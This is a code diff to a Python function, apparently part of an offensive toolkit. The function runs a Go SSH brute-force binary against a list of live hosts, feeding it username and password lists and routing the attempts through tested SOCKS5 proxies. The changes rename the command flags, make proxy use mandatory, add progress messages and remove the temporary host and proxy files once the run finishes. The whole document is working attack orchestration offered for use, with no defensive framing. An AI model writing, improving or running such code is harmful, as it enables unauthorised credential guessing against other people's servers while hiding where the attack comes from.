@@ -2,17 +2,18 @@ import subprocess
 import os
 from globals import global_live_hosts, global_tested_proxies
 
+
 def run_golang_bruteforce():
     """
     Runs the Go-based SSH brute force attack using tested SOCKS5 proxies.
 
     This function ensures that valid proxies and host lists exist before execution.
     """
-    # Use the existing Golang brute-force binary
-    go_bruteforce_binary = "golang_brute"
+    # Corrected binary name
+    go_bruteforce_binary = "golang_brute"  # Updated from 'bruteforce_ssh' to 'golang_brute'
 
     if not os.path.exists(go_bruteforce_binary):
-        print("[ERROR] Golang brute-force binary not found! Make sure it is in the project directory.")
+        print("[ERROR] Golang brute-force binary not found! Compile or download it first.")
         return
 
     if not global_live_hosts:
@@ -56,16 +57,23 @@ def run_golang_bruteforce():
     command = [
         f"./{go_bruteforce_binary}",
         "-hosts", hosts_file,
-        "-userlist", username_file,
-        "-passlist", password_file,
+        "-proxies", proxies_file,
+        "-usernames", username_file,
+        "-passwords", password_file,
         "-threads", str(threads)
     ]
 
-    if global_tested_proxies:
-        command.extend(["-proxies", proxies_file])
+    print("[INFO] Starting Golang brute-force attack...")
 
-    # Execute the command
+    # Run the Golang brute-force binary
     try:
         subprocess.run(command, check=True)
+        print("[INFO] Golang brute-force attack completed.")
     except subprocess.CalledProcessError as e:
-        print(f"[ERROR] Execution failed: {e}")
+        print(f"[ERROR] Golang brute-force failed with error: {e}")
+    finally:
+        # Clean up temporary files
+        if os.path.exists(hosts_file):
+            os.remove(hosts_file)
+        if os.path.exists(proxies_file):
+            os.remove(proxies_file)
